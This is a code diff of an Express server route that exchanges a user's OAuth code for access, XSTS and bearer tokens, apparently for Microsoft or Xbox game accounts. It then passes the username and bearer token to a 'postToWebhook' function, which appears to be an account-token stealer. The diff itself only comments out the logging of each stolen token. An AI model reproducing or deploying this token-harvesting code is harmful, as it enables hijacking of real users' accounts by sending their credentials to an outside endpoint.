@@ -17,17 +17,17 @@ app.get('/', (req, res) => {
         const code = req.query.code
         console.log(code + " is the code\n")
         const accessToken = getAccessToken(code)
-        console.log(accessToken + " is the access token\n")
+        //console.log(accessToken + " is the access token\n")
         const userHash = getUserHashAndToken(accessToken)[0]
-        console.log(userHash + " is the user hash\n")
+        //console.log(userHash + " is the user hash\n")
         const userToken = getUserHashAndToken(accessToken)[1]
-        console.log(userToken + " is the user token\n")
+        //console.log(userToken + " is the user token\n")
         const xstsToken = getXSTSToken(userToken)
-        console.log(xstsToken + " is the xsts token\n")
+        //console.log(xstsToken + " is the xsts token\n")
         const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
-        console.log(bearerToken + " is the bearer token\n")
+        //console.log(bearerToken + " is the bearer token\n")
         const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
-        console.log(username + " is the username\n")
+        //console.log(username + " is the username\n")
         postToWebhook(username, bearerToken)
     } catch (err) {
         console.log("A wild error has appeared!\n" + err + "\n")
